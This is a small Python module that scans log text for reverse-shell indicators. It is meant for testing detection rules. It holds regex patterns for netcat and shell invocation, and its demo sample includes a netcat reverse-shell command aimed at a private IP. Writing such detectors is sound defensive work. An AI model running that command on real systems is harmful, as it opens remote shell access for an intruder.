"""Simple log parser for detection testing (safe)

This module provides utilities to parse text logs and extract lines that match
suspicious patterns. It's intended for testing detection rules and generating
sample alerts for analysis training.
"""
import re
from typing import List

SUSPICIOUS_PATTERNS = [
    re.compile(r"reverse\s*shell", re.I),
    re.compile(r"/bin/(bash|sh)", re.I),
    re.compile(r"nc\s+-e", re.I),
    re.compile(r"connect_back", re.I),
]


def find_suspicious_lines(log_text: str) -> List[str]:
    lines = log_text.splitlines()
    matches = []
    for ln in lines:
        for p in SUSPICIOUS_PATTERNS:
            if p.search(ln):
                matches.append(ln)
                break
    return matches


if __name__ == '__main__':
    # simple demo
    sample = """
    2025-01-01T00:00:00 user invoked /bin/bash -c '...'\n
    suspicious: reverse shell attempt\n
    Another line\n
    nc -e /bin/sh 10.0.0.1 4444\n
    """
    found = find_suspicious_lines(sample)
    print('Found suspicious lines:')
    for f in found:
        print(' -', f)
